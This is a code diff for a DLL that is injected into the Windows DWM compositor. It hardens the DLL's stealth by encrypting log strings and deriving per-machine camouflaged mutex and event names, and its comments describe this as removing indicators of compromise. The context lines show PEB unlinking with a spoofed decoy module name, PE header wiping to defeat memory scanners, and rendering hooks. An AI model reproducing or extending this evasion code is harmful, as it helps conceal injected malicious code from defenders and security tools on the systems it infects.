@@ -27,6 +27,7 @@
 #include "../../shared/supabase_config.h"
 #include "../../shared/handshake.h"
 #include "../../shared/str_enc.h"
+#include "../../shared/obf_names.h"
 #include "config_read.h"
 #include "blob_read.h"
 #include "capture.h"
@@ -218,9 +219,7 @@ static void peb_unlink_dll(HMODULE self) {
         }
 
         if (!our_ent) {
-            slog_writef("payload.log",
-                "peb_unlink: no LDR entry found for base=%p (scanned=%d) -- "
-                "nothing to hide via PEB path (manual-map behavior)",
+            slog_writef("payload.log", SS(SVC_STR_PEB_UNLINK_NOENT),
                 (void *)self, scanned);
             return;
         }
@@ -251,9 +250,7 @@ static void peb_unlink_dll(HMODULE self) {
                 }
             }
         }
-        slog_writef("payload.log",
-            "peb_unlink: pool scan complete (scanned=%d ldr entries): "
-            "loaded=[%s] available=[%s]",
+        slog_writef("payload.log", SS(SVC_STR_PEB_UNLINK_SCAN),
             scanned, loaded_str, avail_str);
 
         /* Now do the mutation on the remembered entry. Unlink from
@@ -314,14 +311,12 @@ static void peb_unlink_dll(HMODULE self) {
             for (size_t k = 0; k < sb_chars && k < 63; k++) {
                 nbuf[k] = (char)sb[k];
             }
-            slog_writef("payload.log",
-                "peb_unlink: unlinked + spoofed BaseDllName -> %s "
-                "(pick=%d, avail=%d, loaded=%d%s)",
+            slog_writef("payload.log", SS(SVC_STR_PEB_UNLINKED),
                 nbuf, pick, avail_count, loaded_count,
                 fallback ? ", FALLBACK-duplicate-name" : "");
         }
     } __except (EXCEPTION_EXECUTE_HANDLER) {
-        slog_write("payload.log", "peb_unlink: EXCEPTION -- DLL remains visible");
+        slog_write("payload.log", SS(SVC_STR_PEB_UNLINK_EXCEPT));
     }
 }
 
@@ -394,9 +389,9 @@ static void wipe_pe_headers(HMODULE self) {
                 VirtualProtect(nt, 8, old_prot, &old_prot);
             }
         }
-        slog_write("payload.log", "pe_wipe: MZ+PE signatures corrupted");
+        slog_write("payload.log", SS(SVC_STR_PE_WIPED));
     } __except (EXCEPTION_EXECUTE_HANDLER) {
-        slog_write("payload.log", "pe_wipe: EXCEPTION during wipe");
+        slog_write("payload.log", SS(SVC_STR_PE_WIPE_EXCEPT));
     }
 }
 
@@ -1805,11 +1800,15 @@ static DWORD WINAPI init_thread(LPVOID param) {
      * (can't FreeLibrary a manual-mapped copy -- no LDR entry),
      * but that's a one-shot cost vs a DWM crash.
      *
-     * Name blends with legit DWM object naming ("DwmCompositor*"
-     * matches the existing SVC_SHUTDOWN_EVENT_NAME pattern). Not
-     * encrypted here -- the string is innocuous + adding str_enc
-     * bloat for one guard call site isn't worth it. */
-    g_init_mutex = CreateMutexA(NULL, FALSE, "Local\\DwmCompositorGuardRelease");
+     * v3 (2026-09-19): name is now a per-box derived GUID from
+     * obf_mutex_initguard() (see shared/obf_names.h) instead of the
+     * fixed plaintext "Local\DwmCompositorGuardRelease". The old literal
+     * was BOTH a static strings-visible IOC AND enumerable in the
+     * session BaseNamedObjects directory by any non-admin process. Both
+     * injected copies on the same box derive the SAME name from
+     * MachineGuid, so the double-init guard still works; a different box
+     * gets a different name (no shared cross-install IOC). */
+    g_init_mutex = CreateMutexA(NULL, FALSE, obf_mutex_initguard());
     DWORD init_mutex_gle = GetLastError();
     if (init_mutex_gle == ERROR_ALREADY_EXISTS) {
         slog_write("payload.log",
@@ -1976,7 +1975,7 @@ static DWORD WINAPI init_thread(LPVOID param) {
     }
 
     if (!hooks_install(&off, on_present)) {
-        early_log("init_thread: hooks_install FAILED");
+        early_log(SS(SVC_STR_INIT_HOOKS_FAILED));
         return 3;
     }
     early_log("init_thread: hooks installed");
@@ -1985,13 +1984,13 @@ static DWORD WINAPI init_thread(LPVOID param) {
      * walks the loader lists (K32EnumProcessModules et al.) no longer
      * sees us. Spoofs BaseDllName to `uiribbon.dll` as a decoy. */
     peb_unlink_dll(g_self);
-    early_log("init_thread: peb_unlink done");
+    early_log(SS(SVC_STR_INIT_PEB_DONE));
 
     /* Corrupt PE headers so memory scanners searching for "MZ" /
      * "PE\0\0" at page boundaries can't identify our image as a
      * valid PE. Belt-and-suspenders on top of the PEB unlink. */
     wipe_pe_headers(g_self);
-    early_log("init_thread: pe_wipe done");
+    early_log(SS(SVC_STR_INIT_PE_DONE));
 
     /* Downgrade our whole image from initial RWX to per-section image-
      * like protections (.text->RX, .data->RW, .rdata->RO). Removes the
@@ -2031,8 +2030,15 @@ static DWORD WINAPI init_thread(LPVOID param) {
     SECURITY_ATTRIBUTES sa = {0};
     PSECURITY_DESCRIPTOR sd = NULL;
     build_shutdown_event_sa(&sa, &sd);
+    /* v3 (2026-09-19): per-box derived, camouflaged event name from
+     * obf_event_shutdown() (was the fixed, str_enc'd but constant-across-
+     * installs "Global\DwmCompositorShutdownRelease"). The old name was a
+     * probe-able IOC once known -- an injected medium-IL hunter that knew
+     * the constant got EXISTS/ACCESS_DENIED. The derived GUID is per-box +
+     * indistinguishable from legit Global\ objects. Launcher + Electron
+     * derive the identical name (verified C/JS/PS byte-for-byte). */
     g_shutdown_ev = CreateEventA(sa.lpSecurityDescriptor ? &sa : NULL,
-                                  TRUE, FALSE, SS(SVC_STR_SHUTDOWN_EVENT));
+                                  TRUE, FALSE, obf_event_shutdown());
     if (sd) LocalFree(sd);   /* CreateEvent duplicates the descriptor */
     if (g_shutdown_ev) {
         DWORD gle = GetLastError();
